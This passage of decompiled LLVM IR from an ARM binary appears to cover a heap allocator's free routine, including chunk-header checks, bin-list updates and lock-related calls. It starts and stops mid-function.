  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  %v3_136b0 = load i32, i32* %v2_136b0, align 4
  store i32 %v3_136b0, i32* %r1.global-to-local, align 4
  %v9_136b4 = icmp eq i32 %v3_136ac, %v3_136b0
  br i1 %v9_136b4, label %dec_label_pc_13750, label %dec_label_pc_136ac.dec_label_pc_136bc_crit_edge

dec_label_pc_136ac.dec_label_pc_136bc_crit_edge:  ; preds = %dec_label_pc_136ac
  %v0_136bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_136bc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136ac.dec_label_pc_136bc_crit_edge, %dec_label_pc_137b0
  %v2_136cc = phi i32 [ %v0_136ac, %dec_label_pc_136ac.dec_label_pc_136bc_crit_edge ], [ %v0_137b0, %dec_label_pc_137b0 ]
  %v0_136bc = phi i32 [ %v0_136bc.pre, %dec_label_pc_136ac.dec_label_pc_136bc_crit_edge ], [ %v3_137b0, %dec_label_pc_137b0 ]
  %v1_136bc = or i32 %v0_136bc, 1
  store i32 %v1_136bc, i32* %r7.global-to-local, align 4
  %v1_136c0 = and i32 %v0_136bc, -2
  store i32 %v1_136c0, i32* %r2.global-to-local, align 4
  %v2_136c4 = add i32 %v1_136c0, %v2_136cc
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  %v4_136c4 = load i32, i32* %v3_136c4, align 4
  %v1_136c8 = or i32 %v4_136c4, 1
  store i32 %v1_136c8, i32* %r3.global-to-local, align 4
  store i32 %v1_136c8, i32* %v3_136c4, align 4
  %v0_136d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_136d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_136d0 = add i32 %v1_136d0, 4
  %v3_136d0 = inttoptr i32 %v2_136d0 to i32*
  store i32 %v0_136d0, i32* %v3_136d0, align 4
  %v0_136d4 = load i32, i32* @r5, align 4
  %v1_136d4 = add i32 %v0_136d4, 8
  store i32 %v1_136d4, i32* %r4.global-to-local, align 4
  %v0_136d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_136d8 = load i32, i32* @r0, align 4
  %v2_136d8 = add i32 %v1_136d8, 8
  %v3_136d8 = inttoptr i32 %v2_136d8 to i32*
  store i32 %v0_136d8, i32* %v3_136d8, align 4
  %v0_136dc = load i32, i32* %r4.global-to-local, align 4
  %v1_136dc = load i32, i32* %sb.global-to-local, align 4
  %v2_136dc = add i32 %v1_136dc, %v0_136dc
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  %v4_136dc = load i32, i32* %v3_136dc, align 4
  store i32 %v4_136dc, i32* %r3.global-to-local, align 4
  %v0_136e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_136e0 = add i32 %v0_136e0, 8
  %v2_136e0 = inttoptr i32 %v1_136e0 to i32*
  %v3_136e0 = load i32, i32* %v2_136e0, align 4
  store i32 %v3_136e0, i32* %r2.global-to-local, align 4
  %v2_136e4 = icmp eq i32 %v4_136dc, 0
  store i1 %v2_136e4, i1* @cpsr_z, align 1
  %v0_136e8 = load i32, i32* @r0, align 4
  %v2_136e8 = add i32 %v3_136e0, 12
  %v3_136e8 = inttoptr i32 %v2_136e8 to i32*
  store i32 %v0_136e8, i32* %v3_136e8, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  %v0_136f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_136f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_136f0 = add i32 %v1_136f0, %v0_136f0
  store i32 %v2_136f0, i32* @r6, align 4
  br i1 %v2_136e4, label %dec_label_pc_13734, label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136bc
  %v0_136f8 = call i32 @function_15ce4()
  store i32 %v0_136f8, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13700 = load i32, i32* %r4.global-to-local, align 4
  %v2_13700 = load i32, i32* %r1.global-to-local, align 4
  %v3_13700 = add i32 %v2_13700, %v1_13700
  %v4_13700 = inttoptr i32 %v3_13700 to i32*
  store i32 0, i32* %v4_13700, align 4
  %v0_13704 = call i32 @function_15ce4()
  %v0_13708 = load i32, i32* @r5, align 4
  %v1_13708 = add i32 %v0_13708, 12
  store i32 %v1_13708, i32* %r3.global-to-local, align 4
  %v1_1370c = load i32, i32* %r1.global-to-local, align 4
  %v2_1370c = add i32 %v1_1370c, %v1_13708
  %v3_1370c = inttoptr i32 %v2_1370c to i32*
  %v4_1370c = load i32, i32* %v3_1370c, align 4
  store i32 %v4_1370c, i32* %r2.global-to-local, align 4
  %v2_13710 = icmp eq i32 %v4_1370c, 0
  br i1 %v2_13710, label %dec_label_pc_13734, label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_136f8
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_1371c = load i32, i32* @r6, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_1372c = icmp eq i32 %v0_1371c, -38
  br i1 %v7_1372c, label %dec_label_pc_1373c, label %dec_label_pc_13734

dec_label_pc_13734:                               ; preds = %dec_label_pc_13718, %dec_label_pc_136f8, %dec_label_pc_136bc
  br label %dec_label_pc_1363c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13718
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1363c

dec_label_pc_13750:                               ; preds = %dec_label_pc_136ac
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13754 = load i32, i32* @r8, align 4
  %v1_13754 = sub i32 32, %v0_13754
  store i32 %v1_13754, i32* %r1.global-to-local, align 4
  %v7_1375c = lshr i32 1, %v1_13754
  store i32 %v7_1375c, i32* %r4.global-to-local, align 4
  %v1_13760 = add i32 %v0_13754, -32
  %v6_13760 = icmp slt i32 %v1_13760, 0
  %v7_13760 = icmp eq i32 %v0_13754, 32
  store i1 %v7_13760, i1* @cpsr_z, align 1
  %v6_13764 = shl i32 1, %v0_13754
  store i32 %v6_13764, i32* %r3.global-to-local, align 4
  br i1 %v6_13760, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_13750
  %v7_13768 = shl i32 1, %v1_13760
  store i32 %v7_13768, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_13750, %bb32
  %v0_13770 = phi i32 [ %v7_1375c, %dec_label_pc_13750 ], [ %v7_13768, %bb32 ]
  %v1_1376c = sub i32 -1, %v6_13764
  store i32 %v1_1376c, i32* %r7.global-to-local, align 4
  %v1_13770 = sub i32 -1, %v0_13770
  store i32 %v1_13770, i32* @r8, align 4
  store i32 %v1_1376c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13778.dec_label_pc_13778_crit_edge, %bb33
  %v1_13780 = phi i32 [ %v1_13780.pre, %dec_label_pc_13778.dec_label_pc_13778_crit_edge ], [ %v1_1376c, %bb33 ]
  %v2_13778 = load i32, i32* @global_var_22408.562, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13780 = and i32 %v2_13778, %v1_13780
  store i32 %v2_13780, i32* %r1.global-to-local, align 4
  %v4_13784 = call i32 @function_15d38(i32 %v2_13778, i32 %v2_13780, i32* nonnull @global_var_22408.562)
  %v2_13788 = icmp eq i32 %v4_13784, 0
  store i1 %v2_13788, i1* @cpsr_z, align 1
  br i1 %v2_13788, label %dec_label_pc_13790, label %dec_label_pc_13778.dec_label_pc_13778_crit_edge

dec_label_pc_13778.dec_label_pc_13778_crit_edge:  ; preds = %dec_label_pc_13778
  %v1_13780.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13778

dec_label_pc_13790:                               ; preds = %dec_label_pc_13778
  %v0_13794 = load i32, i32* @r8, align 4
  store i32 %v0_13794, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13798

dec_label_pc_13798:                               ; preds = %dec_label_pc_13798.dec_label_pc_13798_crit_edge, %dec_label_pc_13790
  %v1_137a0 = phi i32 [ %v1_137a0.pre, %dec_label_pc_13798.dec_label_pc_13798_crit_edge ], [ %v0_13794, %dec_label_pc_13790 ]
  %v2_13798 = load i32, i32* @global_var_2240c.564, align 4
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* %r2.global-to-local, align 4
  %v2_137a0 = and i32 %v2_13798, %v1_137a0
  store i32 %v2_137a0, i32* %r1.global-to-local, align 4
  %v4_137a4 = call i32 @function_15d38(i32 %v2_13798, i32 %v2_137a0, i32* nonnull @global_var_2240c.564)
  %v2_137a8 = icmp eq i32 %v4_137a4, 0
  store i1 %v2_137a8, i1* @cpsr_z, align 1
  br i1 %v2_137a8, label %dec_label_pc_137b0, label %dec_label_pc_13798.dec_label_pc_13798_crit_edge

dec_label_pc_13798.dec_label_pc_13798_crit_edge:  ; preds = %dec_label_pc_13798
  %v1_137a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13798

dec_label_pc_137b0:                               ; preds = %dec_label_pc_13798
  %v0_137b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_137b0 = add i32 %v0_137b0, 4
  %v2_137b0 = inttoptr i32 %v1_137b0 to i32*
  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  store i32 %v3_137b0, i32* %r7.global-to-local, align 4
  %v1_137b4 = add i32 %v0_137b0, 12
  %v2_137b4 = inttoptr i32 %v1_137b4 to i32*
  %v3_137b4 = load i32, i32* %v2_137b4, align 4
  store i32 %v3_137b4, i32* @r0, align 4
  %v1_137b8 = add i32 %v0_137b0, 8
  %v2_137b8 = inttoptr i32 %v1_137b8 to i32*
  %v3_137b8 = load i32, i32* %v2_137b8, align 4
  store i32 %v3_137b8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136bc

; uselistorder directives
  uselistorder i32 %v3_137b0, { 1, 0 }
  uselistorder i32 %v0_137b0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_13798, { 1, 0 }
  uselistorder i32 %v2_13778, { 1, 0 }
  uselistorder i32 %v1_1376c, { 2, 1, 0 }
  uselistorder i32 %v0_136bc, { 1, 0 }
  uselistorder i32 %v3_13690, { 1, 2, 0 }
  uselistorder i32 %v0_13670, { 1, 0 }
  uselistorder i32 %v0_1362c, { 0, 2, 1 }
  uselistorder i32 %v0_135cc, { 1, 0 }
  uselistorder i32 %v4_135b8, { 1, 0 }
  uselistorder i32 %v4_135ac, { 1, 0 }
  uselistorder i32 %v3_1358c, { 2, 1, 0 }
  uselistorder i32 %v0_1358c, { 1, 0 }
  uselistorder i32 %v1_1355c, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v3_13558, { 1, 0 }
  uselistorder i32 %v3_13540, { 1, 2, 0, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 8, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_136bc, { 1, 0 }
  uselistorder label %dec_label_pc_13668, { 1, 0 }
  uselistorder label %dec_label_pc_1362c, { 1, 0 }
  uselistorder label %dec_label_pc_13624, { 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_135a8, { 1, 0 }
  uselistorder label %dec_label_pc_13584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13558, { 1, 0 }
}

define i32 @function_137cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_137cc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_137cc = load i32, i32* @r4, align 4
  %v6_137cc = load i32, i32* @r5, align 4
  %v9_137cc = load i32, i32* @r6, align 4
  %v12_137cc = load i32, i32* @r7, align 4
  %v15_137cc = load i32, i32* @r8, align 4
  %v18_137cc = load i32, i32* @sb, align 4
  %v21_137cc = load i32, i32* @sl, align 4
  %v24_137cc = load i32, i32* @fp, align 4
  %v0_137d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_137d0 = icmp eq i32 %v0_137d0, 0
  br i1 %v2_137d0, label %dec_label_pc_13b90, label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %dec_label_pc_137cc
  %v1_137dc = add i32 %v0_137d0, -8
  store i32 %v1_137dc, i32* @r8, align 4
  %v1_137e0 = add i32 %v0_137d0, -4
  %v2_137e0 = inttoptr i32 %v1_137e0 to i32*
  %v3_137e0 = load i32, i32* %v2_137e0, align 4
  store i32 %v3_137e0, i32* %r1.global-to-local, align 4
  %v1_137e4 = urem i32 %v3_137e0, 2
  store i32 %v1_137e4, i32* @r3, align 4
  %v2_137e4 = icmp eq i32 %v1_137e4, 0
  br i1 %v2_137e4, label %dec_label_pc_13c2c, label %dec_label_pc_137ec

dec_label_pc_137ec:                               ; preds = %dec_label_pc_137dc
  %v1_137ec = and i32 %v3_137e0, -2
  store i32 %v1_137ec, i32* %r0.global-to-local, align 4
  %v2_137f0 = add i32 %v1_137ec, %v1_137dc
  %v3_137f0 = inttoptr i32 %v2_137f0 to i32*
  %v4_137f0 = load i32, i32* %v3_137f0, align 4
  store i32 %v4_137f0, i32* %r3.global-to-local, align 4
  %v9_137f4 = icmp eq i32 %v3_137e0, %v4_137f0
  br i1 %v9_137f4, label %.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_137ec
  store i32 0, i32* @r3, align 4
  call void @llvm.trap()
  unreachable

.preheader:                                       ; preds = %dec_label_pc_137ec
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_137f0, i32* @sb, align 4
  store i32 %v1_137ec, i32* @fp, align 4
  br label %bb62

.loopexit:                                        ; preds = %dec_label_pc_139b4
  %v0_13820.pre = load i32, i32* @r8, align 4
  br label %bb62

bb62:                                             ; preds = %.preheader, %.loopexit
  %v0_13820 = phi i32 [ %v0_13820.pre, %.loopexit ], [ %v1_137dc, %.preheader ]
  %v0_1381c = phi i32 [ %v0_1381c.pre, %.loopexit ], [ %v2_137f0, %.preheader ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.5, %.loopexit ], [ 0, %.preheader ]
  %v1_1381c = add i32 %v0_1381c, 4
  %v2_1381c = inttoptr i32 %v1_1381c to i32*
  %v3_1381c = load i32, i32* %v2_1381c, align 4
  store i32 %v3_1381c, i32* %r3.global-to-local, align 4
  %v1_13820 = inttoptr i32 %v0_13820 to i32*
  %v2_13820 = load i32, i32* %v1_13820, align 4
  store i32 %v2_13820, i32* %r2.global-to-local, align 4
  %v2_13824 = and i32 %v2_13820, %v3_1381c
  store i32 %v2_13824, i32* %r3.global-to-local, align 4
  %v1_13828 = urem i32 %v2_13824, 2
  %v2_13828 = icmp eq i32 %v1_13828, 0
  br i1 %v2_13828, label %dec_label_pc_13968.preheader, label %.dec_label_pc_13830_crit_edge

.dec_label_pc_13830_crit_edge:                    ; preds = %bb62
  %v0_13830.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_13830

dec_label_pc_13830:                               ; preds = %dec_label_pc_139f0, %.dec_label_pc_13830_crit_edge
  %v1_13840 = phi i32 [ %v0_1381c, %.dec_label_pc_13830_crit_edge ], [ %v2_139f0, %dec_label_pc_139f0 ]
  %v0_1383c = phi i32 [ %v0_13830.pre, %.dec_label_pc_13830_crit_edge ], [ %v2_139f4, %dec_label_pc_139f0 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %.dec_label_pc_13830_crit_edge ], [ %stack_var_-44.6, %dec_label_pc_139f0 ]
  %v3_13830 = udiv i32 %v0_1383c, 16
  %v1_13834 = add nsw i32 %v3_13830, -1
  store i32 %v1_13834, i32* @r0, align 4
  %v1_1383c = or i32 %v0_1383c, 1
  store i32 %v1_1383c, i32* %r3.global-to-local, align 4
  %v2_13840 = inttoptr i32 %v1_13840 to i32*
  store i32 %v1_1383c, i32* %v2_13840, align 4
  %v0_13844 = load i32, i32* %r3.global-to-local, align 4
  %v1_13844 = load i32, i32* @r8, align 4
  %v2_13844 = add i32 %v1_13844, 4
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  store i32 %v0_13844, i32* %v3_13844, align 4
  %tmp = icmp ult i32 %v1_13834, 33
  %v4_13848 = load i32, i32* @r0, align 4
  br i1 %tmp, label %.thread, label %dec_label_pc_13850

.thread:                                          ; preds = %dec_label_pc_13830
  store i32 %v4_13848, i32* @sl, align 4
  br label %dec_label_pc_13868

dec_label_pc_13850:                               ; preds = %dec_label_pc_13830
  %tmp80 = icmp ugt i32 %v4_13848, 7168
  br i1 %tmp80, label %.thread45, label %dec_label_pc_1385c

.thread45:                                        ; preds = %dec_label_pc_13850
  store i32 63, i32* @sl, align 4
  br label %dec_label_pc_13868

dec_label_pc_1385c:                               ; preds = %dec_label_pc_13850
  %v0_1385c = call i32 @function_175bc()
  %v3_13860 = udiv i32 %v0_1385c, 2097152
  store i32 %v3_13860, i32* %r0.global-to-local, align 4
  %v1_13864 = add nsw i32 %v3_13860, -496
  store i32 %v1_13864, i32* @sl, align 4
  br label %dec_label_pc_13868

dec_label_pc_13868:                               ; preds = %.thread45, %.thread, %dec_label_pc_1385c
  %v0_13870 = phi i32 [ 63, %.thread45 ], [ %v4_13848, %.thread ], [ %v1_13864, %dec_label_pc_1385c ]
  %v3_1386c = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_1386c, i32* %r2.global-to-local, align 4
  %v3_13870 = mul i32 %v0_13870, 16
  store i32 %v3_13870, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r0.global-to-local, align 4
  %v1_13878 = or i32 %v3_13870, 8
  store i32 %v1_13878, i32* %r3.global-to-local, align 4
  %v2_1387c = icmp eq i32 %v3_1386c, 0
  store i1 %v2_1387c, i1* @cpsr_z, align 1
  %v2_13880 = add i32 %v1_13878, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v2_13880, i32* @r5, align 4
  br i1 %v2_1387c, label %dec_label_pc_13888, label %dec_label_pc_13bc0

dec_label_pc_13888.loopexit:                      ; preds = %dec_label_pc_13be8
  %v0_1388c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13888

dec_label_pc_13888:                               ; preds = %dec_label_pc_13888.loopexit, %dec_label_pc_13868
  %v0_1388c = phi i32 [ %v0_1388c.pre, %dec_label_pc_13888.loopexit ], [ %v0_13870, %dec_label_pc_13868 ]
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v1_1388c = add i32 %v0_1388c, 1
  store i32 %v1_1388c, i32* %r1.global-to-local, align 4
  %v4_13890 = mul i32 %v1_1388c, 16
  %v5_13890 = add i32 %v4_13890, ptrtoint (i32* @global_var_22408.562 to i32)
  %v6_13890 = inttoptr i32 %v5_13890 to i32*
  %v7_13890 = load i32, i32* %v6_13890, align 4
  store i32 %v7_13890, i32* %r3.global-to-local, align 4
  %v2_13894 = icmp eq i32 %v7_13890, 0
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  br i1 %v2_13894, label %dec_label_pc_13c4c, label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_13888, %dec_label_pc_13c4c
  store i32 ptrtoint (i8** @global_var_22b2c.529 to i32), i32* %r1.global-to-local, align 4
  %v3_138a8 = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_138a8, i32* %r3.global-to-local, align 4
  %v2_138ac = icmp eq i32 %v3_138a8, 0
  store i1 %v2_138ac, i1* @cpsr_z, align 1
  br i1 %v2_138ac, label %dec_label_pc_138b4, label %dec_label_pc_13bec

dec_label_pc_138b4:                               ; preds = %dec_label_pc_13c1c, %dec_label_pc_138a4
  %v0_138b4 = load i32, i32* @r8, align 4
  %v1_138b4 = inttoptr i32 %v0_138b4 to i32*
  %v2_138b4 = load i32, i32* %v1_138b4, align 4
  store i32 %v2_138b4, i32* %r2.global-to-local, align 4
  %v0_138b8 = load i32, i32* @sb, align 4
  %v1_138b8 = add i32 %v0_138b8, 4
  %v2_138b8 = inttoptr i32 %v1_138b8 to i32*
  %v3_138b8 = load i32, i32* %v2_138b8, align 4
  %v2_138bc = and i32 %v3_138b8, %v2_138b4
  store i32 %v2_138bc, i32* %r3.global-to-local, align 4
  %v1_138c0 = urem i32 %v2_138bc, 2
  store i32 %v1_138c0, i32* %r2.global-to-local, align 4
  %v2_138c0 = icmp eq i32 %v1_138c0, 0
  br i1 %v2_138c0, label %dec_label_pc_138c8, label %dec_label_pc_13a10

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138b4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r0, align 4
  %v3_138cc = load i32, i32* @global_var_22810.570, align 4
  store i32 %v3_138cc, i32* %r3.global-to-local, align 4
  %v2_138d0 = icmp eq i32 %v3_138cc, 0
  store i1 %v2_138d0, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r4.global-to-local, align 4
  br i1 %v2_138d0, label %dec_label_pc_13914, label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138c8
  %v0_138dc = call i32 @function_15ce4()
  store i32 %v0_138dc, i32* @r0, align 4
  %v0_138e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_138e0 = add i32 %v0_138dc, 1032
  %v3_138e0 = inttoptr i32 %v2_138e0 to i32*
  store i32 %v0_138e0, i32* %v3_138e0, align 4
  %v0_138e4 = call i32 @function_15ce4()
  store i32 %v0_138e4, i32* @r0, align 4
  %v1_138e8 = add i32 %v0_138e4, 1036
  %v2_138e8 = inttoptr i32 %v1_138e8 to i32*
  %v3_138e8 = load i32, i32* %v2_138e8, align 4
  store i32 %v3_138e8, i32* %r3.global-to-local, align 4
  %v2_138ec = icmp eq i32 %v3_138e8, 0
  br i1 %v2_138ec, label %dec_label_pc_13914, label %dec_label_pc_138f4

dec_label_pc_138f4:                               ; preds = %dec_label_pc_138dc
  %v1_138f8 = add i32 %v0_138e4, 1032
  store i32 %v1_138f8, i32* @r0, align 4
  store i32 240, i32* @r7, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_1390c = icmp eq i32 %v0_138e4, -1070
  br i1 %v7_1390c, label %dec_label_pc_13c68, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_138f4, %dec_label_pc_138dc, %dec_label_pc_138c8, %dec_label_pc_13c68
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  %v0_13918 = load i32, i32* @r6, align 4
  %v1_13918 = add i32 %v0_13918, 8
  store i32 %v1_13918, i32* %r2.global-to-local, align 4
  %v2_1391c = add i32 %v0_13918, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 8)
  %v3_1391c = inttoptr i32 %v2_1391c to i32*
  %v4_1391c = load i32, i32* %v3_1391c, align 4
  store i32 %v4_1391c, i32* %r3.global-to-local, align 4
  %v2_13920 = icmp eq i32 %v4_1391c, 0
  store i1 %v2_13920, i1* @cpsr_z, align 1
  store i32 %v2_1391c, i32* @r4, align 4
  br i1 %v2_13920, label %dec_label_pc_13968.preheader, label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %dec_label_pc_13914
  %v0_1392c = call i32 @function_15ce4()
  store i32 %v0_1392c, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13934 = load i32, i32* %r2.global-to-local, align 4
  %v2_13934 = load i32, i32* %r1.global-to-local, align 4
  %v3_13934 = add i32 %v2_13934, %v1_13934
  %v4_13934 = inttoptr i32 %v3_13934 to i32*
  store i32 0, i32* %v4_13934, align 4
  %v0_13938 = call i32 @function_15ce4()
  store i32 %v0_13938, i32* %r0.global-to-local, align 4
  %v0_1393c = load i32, i32* @r6, align 4
  %v1_1393c = add i32 %v0_1393c, 12
  store i32 %v1_1393c, i32* %r3.global-to-local, align 4
  %v1_13940 = load i32, i32* %r1.global-to-local, align 4
  %v2_13940 = add i32 %v1_13940, %v1_1393c
  %v3_13940 = inttoptr i32 %v2_13940 to i32*
  %v4_13940 = load i32, i32* %v3_13940, align 4
  store i32 %v4_13940, i32* %r2.global-to-local, align 4
  %v2_13944 = icmp eq i32 %v4_13940, 0
  br i1 %v2_13944, label %dec_label_pc_13968.preheader, label %dec_label_pc_1394c

dec_label_pc_1394c:                               ; preds = %dec_label_pc_1392c
  store i32 240, i32* @r7, align 4
  %v0_13950 = load i32, i32* @r4, align 4
  store i32 %v0_13950, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_13960 = icmp eq i32 %v0_13950, -38
  br i1 %v7_13960, label %dec_label_pc_13c7c, label %dec_label_pc_13968.preheader

dec_label_pc_13968.preheader:                     ; preds = %dec_label_pc_13c7c, %bb62, %dec_label_pc_13914, %dec_label_pc_1392c, %dec_label_pc_1394c
  %stack_var_-44.4.ph = phi i32 [ %stack_var_-44.3, %dec_label_pc_1394c ], [ %stack_var_-44.3, %dec_label_pc_13c7c ], [ %stack_var_-44.3, %dec_label_pc_1392c ], [ %stack_var_-44.3, %dec_label_pc_13914 ], [ %stack_var_-44.2, %bb62 ]
  %v0_13968.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_13968.preheader, %dec_label_pc_139f0
  %v0_13968 = phi i32 [ %v0_139fc, %dec_label_pc_139f0 ], [ %v0_13968.pre, %dec_label_pc_13968.preheader ]
  %stack_var_-44.4 = phi i32 [ %stack_var_-44.6, %dec_label_pc_139f0 ], [ %stack_var_-44.4.ph, %dec_label_pc_13968.preheader ]
  store i32 %v0_13968, i32* %r0.global-to-local, align 4
  %v1_1396c = inttoptr i32 %v0_13968 to i32*
  %v2_1396c = call i32 @function_132ac(i32* %v1_1396c)
  store i32 %v2_1396c, i32* %r0.global-to-local, align 4
  %v2_13970 = icmp eq i32 %v2_1396c, 0
  br i1 %v2_13970, label %dec_label_pc_139b4, label %dec_label_pc_13978

dec_label_pc_13978:                               ; preds = %dec_label_pc_13968
  %v0_13978 = load i32, i32* @r8, align 4
  %v1_13978 = inttoptr i32 %v0_13978 to i32*
  %v2_13978 = load i32, i32* %v1_13978, align 4
  %v1_1397c = and i32 %v2_13978, -2
  store i32 %v1_1397c, i32* %r3.global-to-local, align 4
  %v2_13980 = sub i32 %v0_13978, %v1_1397c
  store i32 %v2_13980, i32* @r8, align 4
  %v1_13984 = add i32 %v2_13980, 4
  %v2_13984 = inttoptr i32 %v1_13984 to i32*
  %v3_13984 = load i32, i32* %v2_13984, align 4
  store i32 %v1_137ec, i32* %r0.global-to-local, align 4
  %v1_1398c = and i32 %v3_13984, -2
  store i32 %v1_1398c, i32* %r2.global-to-local, align 4
  %v2_13990 = add i32 %v1_1398c, %v1_137ec
  store i32 %v2_13990, i32* %r3.global-to-local, align 4
  %v0_13998 = load i32, i32* @fp, align 4
  %v2_13998 = add i32 %v0_13998, %v1_1398c
  store i32 %v2_13998, i32* @fp, align 4
  %tmp81 = icmp ult i32 %v2_13990, 163841
  br i1 %tmp81, label %dec_label_pc_139b4, label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13978
  %v2_139a0 = xor i32 %v2_13990, %v1_1398c
  store i32 %v2_139a0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.4, i32* %r1.global-to-local, align 4
  %v3_139a8 = icmp ult i32 %v1_1398c, %v2_139a0
  br i1 %v3_139a8, label %bb63, label %dec_label_pc_139b4

bb63:                                             ; preds = %dec_label_pc_139a0
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_139b4

dec_label_pc_139b4:                               ; preds = %dec_label_pc_139a0, %bb63, %dec_label_pc_13978, %dec_label_pc_13968
  %stack_var_-44.5 = phi i32 [ %stack_var_-44.4, %dec_label_pc_13968 ], [ %stack_var_-44.4, %dec_label_pc_13978 ], [ %stack_var_-44.4, %dec_label_pc_139a0 ], [ 1, %bb63 ]
  %v0_139b4 = load i32, i32* @sb, align 4
  store i32 %v0_139b4, i32* %r0.global-to-local, align 4
  %v1_139b8 = call i32 @function_1353c(i32 %v0_139b4)
  store i32 %v1_139b8, i32* %r0.global-to-local, align 4
  %v2_139bc = icmp eq i32 %v1_139b8, 0
  %v0_1381c.pre = load i32, i32* @sb, align 4
  br i1 %v2_139bc, label %.loopexit, label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %dec_label_pc_139b4
  %v1_139c4 = add i32 %v0_1381c.pre, 4
  %v2_139c4 = inttoptr i32 %v1_139c4 to i32*
  %v3_139c4 = load i32, i32* %v2_139c4, align 4
  store i32 %v1_137ec, i32* %r0.global-to-local, align 4
  %v1_139cc = and i32 %v3_139c4, -2
  store i32 %v1_139cc, i32* %r2.global-to-local, align 4
  %v2_139d0 = add i32 %v1_139cc, %v1_137ec
  store i32 %v2_139d0, i32* %r3.global-to-local, align 4
  %tmp82 = icmp ult i32 %v2_139d0, 163841
  br i1 %tmp82, label %dec_label_pc_139f0, label %dec_label_pc_139dc

dec_label_pc_139dc:                               ; preds = %dec_label_pc_139c4
